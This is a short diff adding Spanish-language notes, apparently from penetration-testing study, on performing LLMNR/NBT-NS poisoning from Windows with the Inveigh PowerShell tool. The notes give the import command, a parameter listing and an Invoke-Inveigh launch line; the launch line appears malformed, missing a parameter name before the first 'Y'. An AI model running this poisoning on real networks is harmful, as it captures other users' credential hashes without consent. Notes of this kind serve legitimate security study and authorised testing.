@@ -1,0 +1,8 @@
+Podemos hacer un LLMNR/NBT-NS poisoning desde windows con inveigh.
+
+Desde powershell:
+ Import-Module .\Inveigh.ps1
+ (Get-Command Invoke-Inveigh).Parameters
+
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
